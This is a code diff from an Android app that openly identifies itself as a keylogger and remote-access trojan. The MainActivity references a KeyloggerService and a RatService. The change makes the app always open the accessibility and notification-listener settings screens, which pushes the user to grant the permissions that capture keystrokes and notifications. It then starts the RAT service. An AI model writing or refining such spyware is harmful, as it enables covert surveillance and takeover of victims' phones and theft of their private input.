@@ -22,14 +22,10 @@ public class MainActivity extends Activity {
         };
         ActivityCompat.requestPermissions(this, perms, 1);
 
+        // فتح إعدادات الكيلوجر وإشعارات النظام مباشرة
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
-            if (!Settings.isAccessibilityServiceEnabled(this, KeyloggerService.class)) {
-                startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
-            }
-            String enabledListeners = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
-            if (enabledListeners == null || !enabledListeners.contains(getPackageName())) {
-                startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
-            }
+            startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
+            startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
         }
 
         Intent serviceIntent = new Intent(this, RatService.class);
